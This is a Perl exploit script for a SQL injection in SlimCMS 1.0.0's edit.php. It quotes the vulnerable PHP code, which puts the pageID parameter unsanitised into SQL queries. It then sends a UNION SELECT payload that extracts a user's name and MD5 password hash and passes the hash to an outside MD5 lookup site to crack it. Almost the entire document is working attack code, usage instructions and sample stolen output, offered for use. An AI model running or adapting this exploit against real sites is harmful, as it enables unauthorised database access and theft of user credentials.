SlimCMS <= 1.0.0 (edit.php) Remote SQL Injection Exploit
========================================================


#!/usr/bin/perl

=starting

 --------------------------------------------------------
 SlimCMS <= 1.0.0 (edit.php) Remote SQL Injection Exploit
 --------------------------------------------------------
 by athos - staker
 
 download on sourceforge 
 
 
 File edit.php
 
 111. if ($password == md5($_POST[&#039;password&#039;]))
 112. {
 113.    if (strlen($_POST[&#039;cmsText&#039;]) > 2) {
 114. $query  = "UPDATE pages SET title = &#039;".$_POST[&#039;pageTitle&#039;]."&#039;, content =  &#039;".
      strip_tags(stripslashes($_POST[&#039;cmsText&#039;]),$allowedTags)."&#039; WHERE ID = ".$_GET[&#039;pageID&#039;];
 115. mysql_query($query);
 116. //$successfulyUpdated
 117. responseText = $successfulyUpdated;
 118. }
 119.
 120. if (strlen($_GET[&#039;pageID&#039;]) > 0) {
 121. $query  = "SELECT * FROM pages WHERE ID = ".$_GET[&#039;pageID&#039;];
 122. $result = mysql_query($query);
 123.
 124.				
 125. while($row = mysql_fetch_array($result)) {
 126.	$pageTitle = $row[&#039;title&#039;];
 127.	$pageContent = $row[&#039;content&#039;];
 128.  }
 129. }
 
 NOTE: Works Regardless PHP.ini Settings!
 
  
  you must be logged..
  
  Usage: perl "exploit.pl" [HOST] [username:password] [USER_ID]
  
  Output: Username: athos
          Password: 27e43424d53719a645ae7cca038b45be
 
 

=cut

use strict;
use LWP::UserAgent;
use LWP::Simple;

my $match = q{Editing page "(.+?)"};
my $http = new LWP::UserAgent; 
my $post = undef;
my @login = ();
my @out = ();

my ($host,$auth,$myid) = @ARGV;

unless($host =~ /http:\/\/(.+?)$/i && $auth && $myid)
{
    print STDOUT "Usage: perl $0 [host/path] [username:password] [id]\r\n"; 
    exit;
} 

$host .= "/edit.php?pageID=-1 union select 1,concat(username,0x3a,password),3,4 from users where id=$myid#";

@login = split(&#039;:&#039;,$auth);

$post = $http->post($host,[ 
                            username => $login[0],
                            password => $login[1],
                         ]);


if($post->is_success && $post->content =~ $match) 
{
    @out = split(&#039;:&#039;,$1);
   
    if($#out => 2)
    {
        my $cracked = search_MD5($out[1]);
        
        print STDOUT "Username: $out[0]\r\n";
        print STDOUT "Password: $out[1] -> $cracked\r\n";
        exit;  
   }
   else
   {
       print STDOUT "Exploit Failed!\r\n";
       print STDOUT "Login incorrect or site not vulnerable\\available!\r\n";
       exit;
   }
}


sub search_MD5
{
    my $hash = shift @_;
    my $cont = undef;

    $cont = get(&#039;http://md5.rednoize.com/?p&s=md5&q=&#039;.$hash);
        
    if(length($hash) => 32 && !is_error($cont))
    {
        return $cont;
    }
    else
    {
        return exit;
    }
}   
    
__END__




